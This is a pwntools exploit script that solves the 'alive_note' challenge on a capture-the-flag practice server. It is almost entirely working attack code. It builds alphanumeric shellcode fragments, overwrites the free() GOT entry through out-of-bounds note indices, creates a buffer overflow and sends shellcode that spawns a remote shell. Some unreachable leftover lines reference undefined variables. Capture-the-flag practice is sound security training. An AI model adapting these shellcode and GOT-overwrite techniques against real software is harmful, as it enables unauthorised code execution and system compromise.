#!/usr/bin/env python3
from pwn import *

DWORD = 4
PAD = lambda n: b"a" * n

elf = ELF("./given/alive_note")
if args.REMOTE:
    p = remote("chall.pwnable.tw", 10300)
else:
    p = process([elf.path])
    log.info("[WARNING] this only works on REMOTE because heap region mapping")
    if args.D:
        context.terminal = ["tmux", "splitw", "-h"]
        gdb.attach(p, "\n".join([
                #"b *0x8048777", # __ctype_b_loc
                "b *0x80488ea", # call free()
                "b *0x8048a80" # main's exit
            ]))

def add_note(idx, content):
    """
    The heap region will be executable in REMOTE settings
    The content will be the shellcode
    See check() function in the binary to craft shellcode
    """
    assert(len(content) <= 8)
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Index :", str(idx).encode())
    content = content.ljust(8, b"a")
    p.sendafter(b"Name :", content)

def del_note(idx):
    p.sendlineafter(b"Your choice :", b"3")
    p.sendlineafter(b"Index :", str(idx).encode())


def alphanumeric_shellcode():
    """
    This creates a buffer overflow at %esp instead of doing execve("/bin/sh",0,0)
    see ./shellcode/shellcode.S for detail
    """
    shellcode0 = asm("""\
        push 0x30;
        push 0x70;
        push 0x7a;
        .byte 0x75, 0x38;""")
    #log.info(f"shellcode0: {shellcode0}")
    shellcode1 = asm("""\
        push edx;
        push edx;
        push edx;
        push eax;
        push edx;
        popa;
        .byte 0x75, 0x38;""")
    shellcode2 = asm("""\
        dec ebp;
        xor dword ptr [esi + ecx*2 + 0x64], ebp;
        inc ebp;
        .byte 0x74, 0x38;""")
    shellcode3 = asm("""\
        xor dword ptr [esi + ecx*2 + 0x65], eax;
        inc edx;
        dec edx;
        .byte 0x75, 0x38;""")
    shellcode4 = asm("""\
        xor dword ptr [esi + ecx*2 + 0x66], edx;
        inc edx;
        dec edx;
        .byte 0x75, 0x38;""")
    shellcode5 = asm("""
        xor al, 0x33;
        push esp;
        pop ecx;
        .byte 0x32, 0x4f, 0x46;""")

    shells =  [shellcode0, shellcode1, shellcode2,
               shellcode3, shellcode4, shellcode5]
    for i, sh in enumerate(shells):
        log.info(f"shellcode{i}: {sh} with len: {len(sh)}")
    return shells

    add_note(got_free_idx, shellcode)
    del_note(got_free_idx)

def got_overwrite(shellcodes):
    data_note = 0x804a080
    got_free_idx = (elf.got["free"] - data_note) // DWORD
    log.info(f"free idx : {got_free_idx}")

    for i, shellcode in enumerate(shellcodes):
        idx = got_free_idx if i == 0 else 0
        add_note(idx, shellcode)
        add_note(0, PAD(8))
        add_note(0, PAD(8))
        add_note(0, PAD(8))

    del_note(got_free_idx)


def bufovfl():
    """
    My alphanumeric shellcode creates a bufovfl vuln
    not originate in the binary
    """
    # buffer overflow
    data_note = 0x804a080
    payload = p32(elf.plt["read"]) + p32(data_note) + p32(0) + p32(data_note) + p32(0x100)
    payload = payload.ljust(0x7a)
    p.send(payload)

    # unrestricted shellcoding
    payload = asm(shellcraft.sh())
    p.sendline(payload)

def exploit():
    shellcodes = alphanumeric_shellcode()
    got_overwrite(shellcodes)
    bufovfl()
    p.interactive()

if __name__ == "__main__":
    exploit()
